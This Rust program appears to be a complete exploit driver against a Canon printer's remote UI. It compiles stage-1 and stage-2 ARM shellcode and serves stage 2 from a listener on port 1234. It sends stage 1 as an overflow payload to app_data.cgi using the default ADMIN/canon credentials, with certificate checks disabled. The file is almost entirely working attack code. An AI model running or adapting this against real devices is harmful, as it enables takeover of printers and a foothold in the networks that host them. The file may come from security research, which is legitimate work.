#![feature(bool_to_option)]

use std::time::Duration;
use std::process::Command;

/// A super flexible error type
type Result<T> = std::result::Result<T, Box<dyn std::error::Error>>;

/// Build the stage1 shellcode that we ship to the printer
fn build_stage1() -> Result<()> {
    Command::new("cargo").args(&["build", "--release"])
        .current_dir("stage1")
        .status()?.success().then_some(())
        .ok_or_else(|| "Failed to build stage1".into())
}

/// Build the stage2 shellcode that we ship to the printer
fn build_stage2() -> Result<()> {
    Command::new("cargo").args(&["build", "--release"])
        .current_dir("stage2")
        .status()?.success().then_some(())
        .ok_or_else(|| "Failed to build stage2".into())
}

fn main() -> Result<()> {
    // Build the stage 1
    build_stage1()?;

    // Copy the loaded sections out of the built ELF into a binary format
    Command::new("objcopy").args(&[
        "-O", "binary", "--remove-section=.ARM.exidx",
        "stage1/target/armv7a-none-eabi/release/stage1",
        "stage1.bin"
    ]).status()?.success().then_some(())
        .ok_or_else(|| "Failed to objcopy the stage1")?;

    // Read the stage1 shellcode
    let stage1 = std::fs::read("stage1.bin")?;
    assert!(stage1.len() <= 254, "Stage 1 is too large");
    
    // Build the stage 2
    build_stage2()?;

    // Copy the loaded sections out of the built ELF into a binary format
    Command::new("objcopy").args(&[
        "-O", "binary",
        "stage2/target/armv4t-unknown-linux-gnueabi/release/stage2",
        "stage2.bin"
    ]).status()?.success().then_some(())
        .ok_or_else(|| "Failed to objcopy the stage2")?;

    // Read the stage2 shellcode
    let mut stage2 = std::fs::read("stage2.bin")?;
    assert!(stage2.len() <= 256 * 1024, "Stage 2 is too large");
    stage2.resize(256 * 1024, 0u8);

    let server = std::thread::spawn(move || {
        use std::io::{Read, Write};
        use std::net::TcpListener;

        let listener = TcpListener::bind("0.0.0.0:1234").unwrap();
        for stream in listener.incoming() {
            let mut stream = stream.unwrap();

            print!("Got connection from {:?}\n", stream.peer_addr());

            print!("Sending {} bytes\n", stage2.len());
            stream.write_all(&stage2).unwrap();
            print!("Sent data!\n");
        }
    });

    // Create a client for requests that ignores invalid certs
    let client = reqwest::blocking::ClientBuilder::new()
        .timeout(Duration::from_secs(3600))
        .danger_accept_invalid_certs(true).build()?;

    // Send the exploit
    let encoded: String =
        stage1.iter().map(|x| format!("%{:02X}", x)).collect();
    let resp = client.post("https://192.168.1.159/rui/app_data.cgi")
        .basic_auth("ADMIN", Some("canon"))
        .header("Content-Type", "application/x-www-form-urlencoded")
        .body(format!("SETINFO=0&BONNOTE={}", encoded))
        .send()?.text()?;

    server.join().unwrap();

    Ok(())
}

